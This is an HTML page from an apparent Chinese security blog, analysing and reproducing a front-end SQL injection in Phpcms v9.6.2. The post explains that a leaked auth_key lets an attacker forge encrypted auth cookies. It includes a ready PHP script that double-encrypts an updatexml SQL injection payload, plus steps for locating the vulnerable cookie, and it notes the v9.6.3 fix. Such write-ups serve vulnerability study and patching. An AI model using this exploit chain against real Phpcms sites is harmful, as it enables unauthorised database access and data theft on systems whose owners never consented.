@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpcms v9.6.2 前台sql注入一、漏洞简介二、漏洞影响Phpcms v9.6.2 三、复现过程漏洞分析这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的key 值，我们可以用这个 key 加密我们的 SQL注入payload。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲v9.6.2 版本的注入只能在 windows上利用，具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpcms v9.6.2 前台sql注入一、漏洞简介二、漏洞影响Phpcms v9.6.2 三、复现过程漏洞分析这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的key 值，我们可以用这个 key 加密我们的 SQL注入payload。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲v9.6.2 版本的注入只能在 windows上利用，具">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId32.png">
+<meta property="article:published_time" content="2022-07-08T06:26:01.734Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpcms/Phpcms v9.6.2 前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.734Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-v9-6-2-前台sql注入"><a href="#Phpcms-v9-6-2-前台sql注入" class="headerlink" title="Phpcms v9.6.2 前台sql注入"></a>Phpcms v9.6.2 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms v9.6.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的<br><strong>key</strong> 值，我们可以用这个 <strong>key</strong> 加密我们的 <strong>SQL注入payload</strong><br>。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲<br><strong>v9.6.2</strong> 版本的注入只能在 <strong>windows</strong><br>上利用，具体原因在上面的任意文件读取漏洞分析时也说了。下面我们来具体分析一下这个漏洞。</p>
+<p>漏洞文件位于 <strong>phpcms/modules/member/classes/foreground.class.php</strong><br>，代码如下图。我们可以明显看到下图第33行，程序直接将解密后的数据未经过滤直接带入查询。而待解密数据<br><strong>$phpcms_auth</strong> 和解密秘钥 <strong>$auth_key</strong> 均可构造。</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+<p>我们先来看一下待解密数据 <strong>$phpcms_auth</strong><br>如何构造。从下图中，可以看出程序将从 <strong>cookie</strong> 中的 <strong>xxx_auth</strong><br>字段经过 <strong>sys_auth</strong> 函数解密后，返回给了 <strong>$phpcms_auth</strong><br>，而默认情况下使用 <strong>pc_base::load_config(&#39;system&#39;, &#39;auth_key&#39;)</strong><br>作为加解密的 <strong>key</strong> 值。</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<p>而 <strong>pc_base::load_config(&#39;system&#39;, &#39;auth_key&#39;)</strong><br>的值在网站搭建好后，会存储在 <strong>caches/configs/system.php</strong><br>中，我们可以通过任意文件读取来获得这个值。</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
+<p>现在 <strong>$phpcms_auth</strong> 已经搞定了，我们再来看看 <strong>$auth_key =<br>get_auth_key(&#39;login&#39;)</strong> 如何构造，跟进 <strong>get_auth_key</strong><br>的代码。我们可以看到 <strong>$auth_key</strong> 由<br><strong>$prefix、pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)、ip()</strong><br>三个元素决定。前两个都是已知的，而第三个获取用户IP的函数存在IP伪造的问题，也可以是固定的。</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p>所以 <strong>get_auth_key(&#39;login&#39;)</strong><br>的值也是我们可以构造的，剩下的事情只要我们将 <strong>payload</strong><br>传给加密函数加密两次即可。我们最后再来看一下 <strong>PHPCMS v9.6.3</strong><br>中是如何修复这个漏洞的，补丁如下：</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+<p>可以明显看到，补丁将解密后获得的 <strong>$userid</strong> 进行了强转。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>分析完毕后得到大致流程：</p>
+<p>解密操作：get_cookie(‘auth’)<br>得到$phpcms_auth，get_auth_key(‘login’)得到$auth_key，然后sys_auth($phpcms_auth,<br>‘DECODE’, $auth_key)。</p>
+<p>再通俗些的话：sys_auth方法对cookie中包含auth的参数名对应的密文值，先使用配置文件中的auth_key进行sys_auth得到的值作为第一次解密后的值，然后使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，第一次解密后的值与新的key最后传入sys_auth进行解密得到最终的明文。</p>
+<p>反之加密方法便是：</p>
+<p>使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，使用新的key与明文进行sys_auth得到的值作为第一次加密的密文，然后使用配置文件中的auth_key作为key与第一次加密的密文传入sys_auth得到的值作为最终的密文，也就是cookie字段名称中包含auth的参数对应的值。</p>
+<p><strong>如下是将各个文件中的加密解密方法抓取出来稍作修改，在本地进行payload的加解密操作：</strong></p>
+<pre><code>&lt;?php
+function sys_auth($string, $operation = &#39;ENCODE&#39;, $key = &#39;&#39;, $expiry = 0,$auth_key=&#39;7G6idVtMAxhgFVu5vGp1&#39;) &#123;
+    $ckey_length = 4;
+    $key = md5($key != &#39;&#39; ? $key : $auth_key);
+    $keya = md5(substr($key, 0, 16));
+    $keyb = md5(substr($key, 16, 16));
+    $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;
+    $cryptkey = $keya.md5($keya.$keyc);
+    $key_length = strlen($cryptkey);
+
+    $string = $operation == &#39;DECODE&#39; ? base64_decode(strtr(substr($string, $ckey_length), &#39;-_&#39;, &#39;+/&#39;)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+    $string_length = strlen($string);
+
+    $result = &#39;&#39;;
+    $box = range(0, 255);
+
+    $rndkey = array();
+    for($i = 0; $i &lt;= 255; $i++) &#123;
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+    &#125;
+
+    for($j = $i = 0; $i &lt; 256; $i++) &#123;
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+        $tmp = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    &#125;
+
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+    &#125;
+
+    if($operation == &#39;DECODE&#39;) &#123;
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;
+            return substr($result, 26);
+        &#125; else &#123;
+
+            return &#39;&#39;;
+        &#125;
+    &#125; else &#123;
+        return $keyc.rtrim(strtr(base64_encode($result), &#39;+/&#39;, &#39;-_&#39;), &#39;=&#39;);
+    &#125;
+&#125;
+
+function get_auth_key($prefix,$suffix=&quot;&quot;,$ip=&#39;127.0.0.1&#39;,$auth_key=&#39;7G6idVtMAxhgFVu5vGp1&#39;) &#123;
+    if($prefix==&#39;login&#39;)&#123;
+        $pc_auth_key = md5($auth_key.$ip);
+    &#125;else if($prefix==&#39;email&#39;)&#123;
+        $pc_auth_key = md5($auth_key);
+    &#125;else&#123;
+        $pc_auth_key = md5($auth_key.$suffix);
+    &#125;
+    $authkey = md5($prefix.$pc_auth_key);
+    return $authkey;
+&#125;
+
+//解密过程
+//step 1
+$encryption_str = &#39;6fc7TB1Y1nIRK5HunMc5HAUw5WkBLLuQGBiOISDhJM4d8N8WHHOvqMaUSyWrZdVdH046oGv_e_Ir6Q157UV-yT5Aksuc_h_4RfwZqsEwDHfQckv4SReOiYFxm083X7Tydcw-nUy8l3nP-ouUGl59sN4&#39;;
+$operation1 = &#39;DECODE&#39;;
+$decryption_step1 = (sys_auth($encryption_str, $operation1));
+echo &#39;decryption_step1 result:&#39;.$decryption_step1.&quot;\n&quot;;
+
+//step 2
+$decryption_step2 = $decryption_step1;
+$auth_key = get_auth_key(&#39;login&#39;);
+echo &#39;decryption_step2 result:&#39;.sys_auth($decryption_step2, &#39;DECODE&#39;, $auth_key).&quot;\n&quot;;
+
+echo &#39;-----------------------&#39;.&quot;\n&quot; ;
+
+
+//加密过程
+//step 1
+$clear_str = &quot;1&#39;or updatexml(1,concat(0x7e,(select user()),0x7e),1)  or &#39;1    f867fef04bd76d95abe01300951ca336&quot;;
+$operation2 = &#39;ENCODE&#39;;
+$encryption_step1 = sys_auth($clear_str, &#39;ENCODE&#39;, $auth_key);
+echo &#39;encryption_step1 result:&#39;.$encryption_step1.&quot;\n&quot;;
+
+//step 2
+$encryption_step2 = (sys_auth($encryption_step1, $operation2));
+echo &#39;encryption_step2 result:&#39;.$encryption_step2;
+</code></pre>
+<p>使用上面的代码可以进行解密和加密，下图中decryption_step2<br>result的值便是对payload进行解密的最终结果，encryption_step2的值是对payload进行加密的最终结果。</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
+<p>最终利用的现象，cookie中的YDVIB_auth参数名称，前缀是安装时候生成的可能不一样，可以在配置文件中找到对应的值，可以先注册普通用户然后看服务端下发的cookie中字段名称中xxx_auth的参数名称，便是存在漏洞的位置。</p>
+<p><img src="/resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158352.html">https://www.freebuf.com/column/158352.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5731">https://xz.aliyun.com/t/5731</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qu5t00e2y8v17fvf0v3i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
